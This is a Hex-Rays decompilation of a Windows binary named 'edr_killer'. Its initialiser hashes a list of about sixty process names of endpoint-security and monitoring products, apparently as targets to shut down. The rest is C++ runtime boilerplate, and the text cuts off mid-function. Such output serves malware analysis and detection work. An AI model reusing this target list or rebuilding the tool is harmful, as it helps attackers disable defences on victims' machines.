/* Hex-Rays decompilation of edr_killer */

// ----- sub_140001000 @ 0x140001000 -----
__int64 sub_140001000()
{
  return unknown_libname_70(&unk_14009FC38);
}


// ----- sub_140001020 @ 0x140001020 -----
int sub_140001020()
{
  _BYTE v1[16]; // [rsp+20h] [rbp-158h] BYREF
  _DWORD v2[59]; // [rsp+30h] [rbp-148h] BYREF
  _BYTE v3[4]; // [rsp+11Ch] [rbp-5Ch] BYREF
  __int64 v4; // [rsp+120h] [rbp-58h]
  __int128 v5; // [rsp+128h] [rbp-50h]
  __int128 v6; // [rsp+140h] [rbp-38h] BYREF
  _BYTE v7[40]; // [rsp+150h] [rbp-28h] BYREF

  sub_14000A160(&unk_14009FC18, 24);
  v4 = unknown_libname_71(v1);
  v2[0] = sub_14000A420(L"msmpeng.exe", 2166136261LL);
  v2[1] = sub_14000A420(L"nissrv.exe", 2166136261LL);
  v2[2] = sub_14000A420(L"mssense.exe", 2166136261LL);
  v2[3] = sub_14000A420(L"sensendr.exe", 2166136261LL);
  v2[4] = sub_14000A420(L"csfalconservice.exe", 2166136261LL);
  v2[5] = sub_14000A420(L"csagent.exe", 2166136261LL);
  v2[6] = sub_14000A420(L"sentinelagent.exe", 2166136261LL);
  v2[7] = sub_14000A420(L"sentinelstaticengine.exe", 2166136261LL);
  v2[8] = sub_14000A420(L"sentinelhelper.exe", 2166136261LL);
  v2[9] = sub_14000A420(L"sentinelservice.exe", 2166136261LL);
  v2[10] = sub_14000A420(L"cb.exe", 2166136261LL);
  v2[11] = sub_14000A420(L"cbdefense.exe", 2166136261LL);
  v2[12] = sub_14000A420(L"repmgr.exe", 2166136261LL);
  v2[13] = sub_14000A420(L"xagt.exe", 2166136261LL);
  v2[14] = sub_14000A420(L"cyveraservice.exe", 2166136261LL);
  v2[15] = sub_14000A420(L"traps.exe", 2166136261LL);
  v2[16] = sub_14000A420(L"cyserver.exe", 2166136261LL);
  v2[17] = sub_14000A420(L"elastic-endpoint.exe", 2166136261LL);
  v2[18] = sub_14000A420(L"elastic-agent.exe", 2166136261LL);
  v2[19] = sub_14000A420(L"cybereason.exe", 2166136261LL);
  v2[20] = sub_14000A420(L"minionhost.exe", 2166136261LL);
  v2[21] = sub_14000A420(L"crsensor.exe", 2166136261LL);
  v2[22] = sub_14000A420(L"cylancesvc.exe", 2166136261LL);
  v2[23] = sub_14000A420(L"cylanceui.exe", 2166136261LL);
  v2[24] = sub_14000A420(L"ccsvchst.exe", 2166136261LL);
  v2[25] = sub_14000A420(L"smc.exe", 2166136261LL);
  v2[26] = sub_14000A420(L"symcorpui.exe", 2166136261LL);
  v2[27] = sub_14000A420(L"mcshield.exe", 2166136261LL);
  v2[28] = sub_14000A420(L"mfevtps.exe", 2166136261LL);
  v2[29] = sub_14000A420(L"mfeesp.exe", 2166136261LL);
  v2[30] = sub_14000A420(L"mfevtp.exe", 2166136261LL);
  v2[31] = sub_14000A420(L"tmntsrv.exe", 2166136261LL);
  v2[32] = sub_14000A420(L"ntrtscan.exe", 2166136261LL);
  v2[33] = sub_14000A420(L"pccntmon.exe", 2166136261LL);
  v2[34] = sub_14000A420(L"tmlisten.exe", 2166136261LL);
  v2[35] = sub_14000A420(L"savservice.exe", 2166136261LL);
  v2[36] = sub_14000A420(L"sophoshealth.exe", 2166136261LL);
  v2[37] = sub_14000A420(L"sophossps.exe", 2166136261LL);
  v2[38] = sub_14000A420(L"sophosfilescanner.exe", 2166136261LL);
  v2[39] = sub_14000A420(L"sophosclean.exe", 2166136261LL);
  v2[40] = sub_14000A420(L"sophososquery.exe", 2166136261LL);
  v2[41] = sub_14000A420(L"avp.exe", 2166136261LL);
  v2[42] = sub_14000A420(L"kavsvc.exe", 2166136261LL);
  v2[43] = sub_14000A420(L"ekrn.exe", 2166136261LL);
  v2[44] = sub_14000A420(L"egui.exe", 2166136261LL);
  v2[45] = sub_14000A420(L"bdagent.exe", 2166136261LL);
  v2[46] = sub_14000A420(L"vsserv.exe", 2166136261LL);
  v2[47] = sub_14000A420(L"bdservice.exe", 2166136261LL);
  v2[48] = sub_14000A420(L"sfc.exe", 2166136261LL);
  v2[49] = sub_14000A420(L"forticlient.exe", 2166136261LL);
  v2[50] = sub_14000A420(L"fortiesnac.exe", 2166136261LL);
  v2[51] = sub_14000A420(L"mbam.exe", 2166136261LL);
  v2[52] = sub_14000A420(L"mbamservice.exe", 2166136261LL);
  v2[53] = sub_14000A420(L"avastsvc.exe", 2166136261LL);
  v2[54] = sub_14000A420(L"avgsvc.exe", 2166136261LL);
  v2[55] = sub_14000A420(L"taniumclient.exe", 2166136261LL);
  v2[56] = sub_14000A420(L"qualysagent.exe", 2166136261LL);
  v2[57] = sub_14000A420(L"ir_agent.exe", 2166136261LL);
  v2[58] = sub_14000A420(L"splunkd.exe", 2166136261LL);
  v5 = *(_OWORD *)unknown_libname_74(v7, v2, v3);
  v6 = v5;
  sub_140005750(&unk_14009FC18, &v6, v4);
  return atexit(sub_14002C750);
}


// ----- sub_14000161C @ 0x14000161c -----
int sub_14000161C()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_14009FC50);
  return atexit(sub_14002C768);
}


// ----- sub_14000163C @ 0x14000163c -----
int sub_14000163C()
{
  return atexit(sub_14002C774);
}


// ----- sub_140001648 @ 0x140001648 -----
int sub_140001648()
{
  return atexit((void (__cdecl *)())std::`dynamic atexit destructor for 'classic_locale'');
}


// ----- sub_140001654 @ 0x140001654 -----
int sub_140001654()
{
  return atexit((void (__cdecl *)())unknown_libname_68);
}


// ----- sub_140001660 @ 0x140001660 -----
int sub_140001660()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_14009FEE0);
  return atexit(sub_14002C84C);
}


// ----- sub_140001680 @ 0x140001680 -----
__int64 __fastcall sub_140001680(__int64 a1)
{
  unknown_libname_71(a1);
  sub_140004550(a1);
  return a1;
}


// ----- sub_1400016B0 @ 0x1400016b0 -----
__int64 __fastcall sub_1400016B0(__int64 a1)
{
  unknown_libname_71(a1);
  unknown_libname_73(a1);
  return a1;
}


// ----- unknown_libname_70 @ 0x1400016e0 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
_QWORD *__fastcall unknown_libname_70(_QWORD *a1)
{
  *a1 = 0;
  return a1;
}


// ----- unknown_libname_2 @ 0x140001700 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_2(_QWORD *a1, __int64 a2, _QWORD *a3)
{
  *a1 = *a3;
  return a1;
}


// ----- sub_140001730 @ 0x140001730 -----
__int64 __fastcall sub_140001730(__int64 a1)
{
  unknown_libname_73(a1);
  return a1;
}


// ----- sub_140001760 @ 0x140001760 -----
__int64 __fastcall sub_140001760(__int64 a1)
{
  sub_140004550(a1);
  return a1;
}


// ----- sub_140001790 @ 0x140001790 -----
_QWORD *__fastcall sub_140001790(_QWORD *a1, __int64 a2)
{
  unsigned __int8 v3; // [rsp+20h] [rbp-18h]
  __int64 v5; // [rsp+48h] [rbp+10h] BYREF

  v5 = a2;
  unknown_libname_2(a1, v3, &v5);
  return a1;
}


// ----- sub_1400017D0 @ 0x1400017d0 -----
__int64 __fastcall sub_1400017D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rax
  unsigned int v4; // eax
  unsigned __int8 v5; // al
  __int64 v6; // rdx
  unsigned __int8 v7; // al
  char v9; // [rsp+20h] [rbp-98h]
  unsigned int v10; // [rsp+24h] [rbp-94h]
  unsigned int v11; // [rsp+28h] [rbp-90h]
  __int64 v12; // [rsp+30h] [rbp-88h]
  __int64 v13; // [rsp+50h] [rbp-68h]
  unsigned __int64 v14; // [rsp+58h] [rbp-60h]
  __int64 v15; // [rsp+60h] [rbp-58h]
  _BYTE v16[16]; // [rsp+88h] [rbp-30h] BYREF
  _BYTE v17[16]; // [rsp+98h] [rbp-20h] BYREF

  v10 = 0;
  v9 = 0;
  sub_1400062C0(v17, a1, 0);
  if ( (unsigned __int8)std::optional<unsigned __int64>::operator bool(v17) != 0 )
  {
    v13 = std::ios_base::getloc(*(int *)(*(_QWORD *)a1 + 4LL) + a1, v16);
    v15 = sub_1400043A0(v13);
    sub_140006DC0(v16);
    unknown_libname_76(a2, 0);
    if ( std::ios_base::width((std::ios_base *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1)) <= 0
      || (v14 = std::string::shrink_to_fit(a2),
          std::ios_base::width((std::ios_base *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1)) >= v14) )
    {
      v12 = std::string::shrink_to_fit(a2);
    }
    else
    {
      v12 = std::ios_base::width((std::ios_base *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1));
    }
    v2 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
    v11 = sub_14000DAB0(v2);
    while ( v12 != 0 )
    {
      v4 = sub_14000B200();
      if ( (unsigned __int8)std::_Narrow_char_traits<char,int>::eq_int_type(v4, v11) != 0 )
      {
        v10 = 1;
        break;
      }
      v5 = std::_Narrow_char_traits<char,int>::to_char_type(v11);
      LOWORD(v6) = 72;
      if ( (unsigned __int8)std::ctype<char>::is(v15, v6, v5) != 0 )
        break;
      v7 = std::_Narrow_char_traits<char,int>::to_char_type(v11);
      sub_14000CE90(a2, v7);
      v9 = 1;
      --v12;
      v3 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
      v11 = sub_14000DB60(v3);
    }
  }
  std::ios_base::width((std::ios_base *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1), 0);
  if ( v9 == 0 )
    v10 |= 2u;
  sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, v10, 0);
  sub_140006E30(v17);
  return a1;
}


// ----- sub_140001B00 @ 0x140001b00 -----
__int64 __fastcall sub_140001B00(__int64 a1, __int64 a2)
{
  return sub_1400084E0(a1, a2);
}


// ----- sub_140001B30 @ 0x140001b30 -----
__int64 __fastcall sub_140001B30(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax

  v3 = std::string::append(a2, a3);
  sub_140004F70(a1, v3);
  return a1;
}


// ----- sub_140001B80 @ 0x140001b80 -----
__int64 __fastcall sub_140001B80(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  int v4; // eax
  unsigned __int8 v6; // [rsp+41h] [rbp-27h]
  unsigned __int64 v7; // [rsp+48h] [rbp-20h]
  __int64 v8; // [rsp+50h] [rbp-18h]

  v8 = unknown_libname_77(a2);
  v3 = sub_14000BBE0(a3);
  v7 = unknown_libname_71(v3);
  if ( std::string::shrink_to_fit(a2) - v8 < v7 )
    sub_14000A100();
  v4 = sub_14000A400(a2);
  sub_1400051B0(a1, v6, a2, v4, v8, a3, v7);
  return a1;
}


// ----- ?deallocate@__crt_win32_buffer_no_resizing@@SAXQEAXAEBV__crt_win32_buffer_empty_debug_info@@@Z @ 0x140001c50 -----
// Microsoft VisualC v14 64bit runtime
static void __fastcall __crt_win32_buffer_no_resizing::deallocate(
        void *const a1,
        const struct __crt_win32_buffer_empty_debug_info *a2)
{
  ;
}


// ----- sub_140001C60 @ 0x140001c60 -----
__int64 __fastcall sub_140001C60(unsigned __int64 a1)
{
  if ( a1 == 0 )
    return 0;
  if ( (unsigned __int8)sub_1400092F0() != 0 || a1 < 0x1000 )
    return sub_140007BB0(a1);
  return sub_140001ED0(a1);
}


// ----- ??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPEADAEAV?$allocator@D@0@AEA_K@Z @ 0x140001cc0 -----
__int64 __fastcall std::_Allocate_at_least_helper<std::allocator<char>>(__int64 a1, _QWORD *a2)
{
  return std::allocator<char>::allocate(a1, *a2);
}


// ----- ??$set_environment_variable@AEAY03$$CBDAEBQEBD@?$__crt_char_traits@D@@SAHAEAY03$$CBDAEBQEBD@Z @ 0x140001cf0 -----
__int64 __fastcall __crt_char_traits<char>::set_environment_variable<char const (&)[4],char const * const &>(
        __int64 a1,
        _QWORD *a2)
{
  return sub_14000A1B0(a1, *a2);
}


// ----- ??$set_environment_variable@AEAY03$$CBDAEBQEBD@?$__crt_char_traits@D@@SAHAEAY03$$CBDAEBQEBD@Z_0 @ 0x140001d20 -----
__int64 __fastcall __crt_char_traits<char>::set_environment_variable<char const (&)[4],char const * const &>(
        __int64 a1,
        _QWORD *a2)
{
  return sub_14000A1E0(a1, *a2);
}


// ----- sub_140001D50 @ 0x140001d50 -----
__int64 __fastcall sub_140001D50(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 i; // [rsp+20h] [rbp-28h]
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]

  ++*a2;
  v4 = std::_Allocate_at_least_helper<std::allocator<char>>(a1, a2);
  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    v5 = unknown_libname_71(v4);
    for ( i = 0; i < *a2; ++i )
      std::construct_at<char,,0>(i + v5);
  }
  --*a2;
  return v4;
}


// ----- sub_140001E10 @ 0x140001e10 -----
__int64 __fastcall sub_140001E10(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 i; // [rsp+20h] [rbp-28h]
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]

  ++*a2;
  v4 = __crt_char_traits<char>::set_environment_variable<char const (&)[4],char const * const &>(a1, a2);
  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    v5 = unknown_libname_71(v4);
    for ( i = 0; i < *a2; ++i )
      std::construct_at<wchar_t,,0>(v5 + 2 * i);
  }
  --*a2;
  return v4;
}


// ----- sub_140001ED0 @ 0x140001ed0 -----
unsigned __int64 __fastcall sub_140001ED0(unsigned __int64 a1)
{
  __int64 v2; // [rsp+20h] [rbp-28h]
  unsigned __int64 v3; // [rsp+28h] [rbp-20h]

  v3 = a1 + 39;
  if ( a1 + 39 < a1 )
    sub_140009BC0();
  v2 = sub_140007BB0(v3);
  if ( v2 == 0 )
    __fastfail(5u);
  *(_QWORD *)(((v2 + 39) & 0xFFFFFFFFFFFFFFE0uLL) - 8) = v2;
  return (v2 + 39) & 0xFFFFFFFFFFFFFFE0uLL;
}


// ----- sub_140001F50 @ 0x140001f50 -----
__int64 __fastcall sub_140001F50(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  _BYTE v4[8]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v5; // [rsp+38h] [rbp-20h]
  __int64 v6; // [rsp+40h] [rbp-18h]

  v5 = *(_QWORD *)(a1 + 16);
  if ( a3 > *(_QWORD *)(a1 + 24) - v5 )
    return sub_140003400(a1, a3, v4[1], a2, a3);
  *(_QWORD *)(a1 + 16) = a3 + v5;
  v6 = unknown_libname_21(a1);
  sub_140003B70(v5 + v6, a2, a3);
  v4[0] = 0;
  unknown_libname_25(a3 + v5 + v6, v4);
  return a1;
}


// ----- ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z @ 0x140002040 -----
__int64 __fastcall std::string::append(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int8 v4; // [rsp+30h] [rbp-28h]
  __int16 v5; // [rsp+32h] [rbp-26h] BYREF
  __int64 v6; // [rsp+38h] [rbp-20h]
  __int64 v7; // [rsp+40h] [rbp-18h]

  v6 = *(_QWORD *)(a1 + 16);
  if ( a3 > *(_QWORD *)(a1 + 24) - v6 )
    return sub_1400035D0(a1, a3, v4, a2, a3);
  *(_QWORD *)(a1 + 16) = a3 + v6;
  v7 = unknown_libname_22(a1);
  sub_140003BA0(v7 + 2 * v6, a2, a3);
  v5 = 0;
  unknown_libname_26(v7 + 2 * (a3 + v6), &v5);
  return a1;
}


// ----- ??$_Bit_cast@_KT_Addr_storage@error_category@std@@$0A@@std@@YA_KAEBT_Addr_storage@error_category@0@@Z @ 0x140002130 -----
__int64 __fastcall std::_Bit_cast<unsigned __int64,std::error_category::_Addr_storage,0>(__int64 a1)
{
  return *(_QWORD *)a1;
}


// ----- sub_140002150 @ 0x140002150 -----
__int64 __fastcall sub_140002150(struct std::_Container_base0 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  char v7; // [rsp+20h] [rbp-48h] BYREF
  _BYTE v8[7]; // [rsp+21h] [rbp-47h] BYREF
  struct std::_Container_base0 *v9; // [rsp+28h] [rbp-40h]
  __int64 v10; // [rsp+30h] [rbp-38h]
  __int64 v11; // [rsp+38h] [rbp-30h] BYREF
  char v12; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v13[7]; // [rsp+41h] [rbp-27h] BYREF
  __int64 v14; // [rsp+48h] [rbp-20h] BYREF

  v9 = a1;
  if ( a3 > std::string::shrink_to_fit(a1) )
    sub_14000A100();
  v10 = sub_140008610(a1);
  v13[0] = __crt_fast_encode_pointer(v10);
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)&v12,
    (const struct std::_Fake_allocator *)v13,
    v9);
  if ( a3 > 0xF )
  {
    v4 = std::string::shrink_to_fit(a1);
    v14 = sub_140007D40(a3, 15, v4);
    v11 = sub_140001D50(v10, (unsigned __int64 *)&v14);
    sub_140002850(v9, &v11);
    *((_QWORD *)v9 + 2) = a3;
    *((_QWORD *)v9 + 3) = v14;
    v5 = unknown_libname_71(v11);
    sub_1400039A0(v5, a2, a3);
    v8[0] = 0;
    v6 = unknown_libname_71(v11);
    unknown_libname_25(a3 + v6, v8);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v12);
  }
  else
  {
    *((_QWORD *)v9 + 2) = a3;
    *((_QWORD *)v9 + 3) = 15;
    sub_1400039A0(v9, a2, a3);
    v7 = 0;
    unknown_libname_25((char *)v9 + a3, &v7);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v12);
  }
}


// ----- sub_140002310 @ 0x140002310 -----
__int64 __fastcall sub_140002310(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int16 v8; // [rsp+28h] [rbp-40h] BYREF
  __int16 v9; // [rsp+2Ah] [rbp-3Eh] BYREF
  __int64 v10; // [rsp+30h] [rbp-38h]
  __int64 v11; // [rsp+38h] [rbp-30h] BYREF
  char v12; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v13[7]; // [rsp+41h] [rbp-27h] BYREF
  __int64 v14; // [rsp+48h] [rbp-20h] BYREF

  if ( a3 > std::string::shrink_to_fit(a1) )
    sub_14000A100();
  v10 = sub_140008610(a1);
  v13[0] = __crt_fast_encode_pointer(v10);
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)&v12,
    (const struct std::_Fake_allocator *)v13,
    (const struct std::_Container_base0 *)a1);
  if ( a3 > 7 )
  {
    v4 = std::string::shrink_to_fit(a1);
    v14 = sub_140007E40(a3, 7, v4);
    v11 = sub_140001E10(v10, (unsigned __int64 *)&v14);
    sub_140002850(a1, &v11);
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = v14;
    v5 = unknown_libname_71(v11);
    sub_1400039D0(v5, a2, a3);
    v9 = 0;
    v6 = unknown_libname_71(v11);
    unknown_libname_26(v6 + 2 * a3, &v9);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v12);
  }
  else
  {
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = 7;
    sub_1400039D0(a1, a2, a3);
    v8 = 0;
    unknown_libname_26(a1 + 2 * a3, &v8);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v12);
  }
}


// ----- sub_1400024E0 @ 0x1400024e0 -----
__int64 __fastcall sub_1400024E0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v7; // [rsp+28h] [rbp-40h]
  __int64 v8; // [rsp+38h] [rbp-30h] BYREF
  char v9; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v10[7]; // [rsp+41h] [rbp-27h] BYREF
  __int64 v11; // [rsp+48h] [rbp-20h] BYREF

  if ( a3 > std::string::shrink_to_fit(a1) )
    sub_14000A100();
  v7 = sub_140008610(a1);
  v10[0] = __crt_fast_encode_pointer(v7);
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)&v9,
    (const struct std::_Fake_allocator *)v10,
    (const struct std::_Container_base0 *)a1);
  if ( a3 > 0xF )
  {
    v4 = std::string::shrink_to_fit(a1);
    v11 = sub_140007D40(a3, 15, v4);
    v8 = sub_140001D50(v7, (unsigned __int64 *)&v11);
    sub_140002850(a1, &v8);
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = v11;
    v5 = unknown_libname_71(v8);
    sub_14000A830(v5, a2, a3 + 1);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v9);
  }
  else
  {
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = 15;
    sub_14000A830(a1, a2, 16);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v9);
  }
}


// ----- sub_140002660 @ 0x140002660 -----
__int64 __fastcall sub_140002660(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v7; // [rsp+28h] [rbp-40h]
  __int64 v8; // [rsp+38h] [rbp-30h] BYREF
  char v9; // [rsp+40h] [rbp-28h] BYREF
  _BYTE v10[7]; // [rsp+41h] [rbp-27h] BYREF
  __int64 v11; // [rsp+48h] [rbp-20h] BYREF

  if ( a3 > std::string::shrink_to_fit(a1) )
    sub_14000A100();
  v7 = sub_140008610(a1);
  v10[0] = __crt_fast_encode_pointer(v7);
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)&v9,
    (const struct std::_Fake_allocator *)v10,
    (const struct std::_Container_base0 *)a1);
  if ( a3 > 7 )
  {
    v4 = std::string::shrink_to_fit(a1);
    v11 = sub_140007E40(a3, 7, v4);
    v8 = sub_140001E10(v7, (unsigned __int64 *)&v11);
    sub_140002850(a1, &v8);
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = v11;
    v5 = unknown_libname_71(v8);
    sub_14000A8C0(v5, a2, a3 + 1);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v9);
  }
  else
  {
    *(_QWORD *)(a1 + 16) = a3;
    *(_QWORD *)(a1 + 24) = 7;
    sub_14000A8C0(a1, a2, 8);
    return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(&v9);
  }
}


// ----- sub_1400027E0 @ 0x1400027e0 -----
_BYTE *__fastcall sub_1400027E0(__int64 a1, _BYTE *a2)
{
  __int64 v2; // rax
  _BYTE *result; // rax
  __int64 v4; // rax

  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    v2 = unknown_libname_71(a1);
    return (_BYTE *)std::construct_at<char,char const &,0>(v2, a2);
  }
  else
  {
    v4 = unknown_libname_71(a1);
    result = (_BYTE *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(1, v4);
    *result = *a2;
  }
  return result;
}


// ----- sub_140002850 @ 0x140002850 -----
_QWORD *__fastcall sub_140002850(__int64 a1, _QWORD *a2)
{
  __int64 v2; // rax
  _QWORD *result; // rax
  __int64 v4; // rax

  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    v2 = unknown_libname_71(a1);
    return (_QWORD *)unknown_libname_8(v2, a2);
  }
  else
  {
    v4 = unknown_libname_71(a1);
    result = (_QWORD *)_lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(8, v4);
    *result = *a2;
  }
  return result;
}


// ----- sub_1400028C0 @ 0x1400028c0 -----
__int64 __fastcall sub_1400028C0(const struct std::_Container_base0 *a1, __int64 a2, _QWORD *a3, _QWORD *a4)
{
  __int64 v5; // [rsp+28h] [rbp-30h]
  const struct std::_Container_base0 *v6; // [rsp+30h] [rbp-28h] BYREF
  char v7; // [rsp+38h] [rbp-20h] BYREF
  _BYTE v8[7]; // [rsp+39h] [rbp-1Fh] BYREF

  v5 = sub_140008610(a1);
  v7 = __crt_fast_encode_pointer(v5);
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)v8,
    (const struct std::_Fake_allocator *)&v7,
    a1);
  if ( a2 != 0 )
  {
    sub_140007BD0(a1, a2);
    v6 = a1;
    *((_QWORD *)a1 + 1) = sub_140003C20(*a3, *a4, *(_QWORD *)a1, v5);
    v6 = nullptr;
    sub_140006500(&v6);
  }
  return _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()(v8);
}


// ----- unknown_libname_71 @ 0x1400029a0 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_71(__int64 a1)
{
  return a1;
}


// ----- sub_1400029B0 @ 0x1400029b0 -----
__int64 __fastcall sub_1400029B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [rsp+30h] [rbp-28h]
  __int64 v5; // [rsp+38h] [rbp-20h]
  __int64 v6; // [rsp+60h] [rbp+8h] BYREF
  __int64 v7; // [rsp+68h] [rbp+10h] BYREF
  __int64 v8; // [rsp+70h] [rbp+18h]

  v8 = a3;
  v7 = a2;
  v6 = a1;
  v4 = sub_140003980(&v6);
  v5 = sub_140003980(&v7);
  return sub_140002AE0(v4, v8, v5 - v4, v5 - v4);
}


// ----- sub_140002A40 @ 0x140002a40 -----
__int64 __fastcall sub_140002A40(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [rsp+20h] [rbp-38h]
  __int64 v5; // [rsp+28h] [rbp-30h]
  __int64 v6; // [rsp+60h] [rbp+8h] BYREF
  __int64 v7; // [rsp+68h] [rbp+10h] BYREF
  __int64 v8; // [rsp+70h] [rbp+18h]

  v8 = a3;
  v7 = a2;
  v6 = a1;
  v4 = sub_140003980(&v6);
  v5 = sub_140003980(&v7);
  return sub_140002AE0(v4, v8, v5 - v4, (v5 - v4) >> 2);
}


// ----- sub_140002AE0 @ 0x140002ae0 -----
size_t sub_140002AE0(const void *a1, ...)
{
  void *v2; // [rsp+20h] [rbp-18h]
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF
  va_list va; // [rsp+48h] [rbp+10h]
  size_t Size; // [rsp+50h] [rbp+18h]
  va_list va1; // [rsp+58h] [rbp+20h] BYREF

  va_start(va1, a1);
  va_start(va, a1);
  v4 = va_arg(va1, _QWORD);
  Size = va_arg(va1, _QWORD);
  v2 = (void *)sub_140003980((__int64 *)va);
  memcpy(v2, a1, Size);
  return (size_t)v2 + Size;
}


// ----- sub_140002B40 @ 0x140002b40 -----
void __fastcall sub_140002B40(void *a1, unsigned __int64 a2)
{
  void *Block; // [rsp+30h] [rbp+8h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp+10h] BYREF

  v3 = a2;
  Block = a1;
  if ( (unsigned __int8)sub_1400092F0() != 0 )
  {
    j_j__free_base(Block);
  }
  else
  {
    if ( v3 >= 0x1000 )
      sub_140007B20(&Block, &v3);
    j_j_j__free_base(Block);
  }
}


// ----- ??R_lambda_daad5f71a1db84f3475a074fd2d177ad_@@QEBA@XZ @ 0x140002ba0 -----
void _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()()
{
  ;
}


// ----- __castguard_slow_path_check_nop @ 0x140002bb0 -----
void _castguard_slow_path_check_nop()
{
  ;
}


// ----- sub_140002BC0 @ 0x140002bc0 -----
__int64 __fastcall sub_140002BC0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // [rsp+20h] [rbp-18h]

  v3 = unknown_libname_71(*(_QWORD *)(a1 + 8));
  sub_140003ED0(*(_QWORD *)(a1 + 16), v3, a2);
  result = *(_QWORD *)(a1 + 8) + 4LL;
  *(_QWORD *)(a1 + 8) = result;
  return result;
}


// ----- sub_140002C20 @ 0x140002c20 -----
__int64 __fastcall sub_140002C20(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // [rsp+20h] [rbp-18h]

  v3 = unknown_libname_71(*(_QWORD *)(a1 + 8));
  sub_140003EA0(*(_QWORD *)(a1 + 16), v3, a2);
  result = *(_QWORD *)(a1 + 8) + 1LL;
  *(_QWORD *)(a1 + 8) = result;
  return result;
}


// ----- sub_140002C80 @ 0x140002c80 -----
__int64 __fastcall sub_140002C80(__int64 a1, _BYTE *a2)
{
  _QWORD *v3; // [rsp+20h] [rbp-28h]

  v3 = (_QWORD *)(a1 + 8);
  sub_1400027E0(*(_QWORD *)(a1 + 8), a2);
  _castguard_slow_path_check_nop();
  return (*v3)++;
}


// ----- sub_140002D00 @ 0x140002d00 -----
__int64 __fastcall sub_140002D00(__int64 a1, _BYTE *a2)
{
  if ( *(_QWORD *)(a1 + 8) == *(_QWORD *)(a1 + 16) )
    return sub_140002D70(a1, *(_QWORD *)(a1 + 8), a2);
  else
    return sub_140002C80(a1, a2);
}


// ----- sub_140002D70 @ 0x140002d70 -----
__int64 __fastcall sub_140002D70(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  __int64 v5; // [rsp+20h] [rbp-98h]
  __int64 v6; // [rsp+28h] [rbp-90h]
  __int64 v7; // [rsp+30h] [rbp-88h]
  _QWORD *v8; // [rsp+40h] [rbp-78h]
  __int64 v9; // [rsp+50h] [rbp-68h]
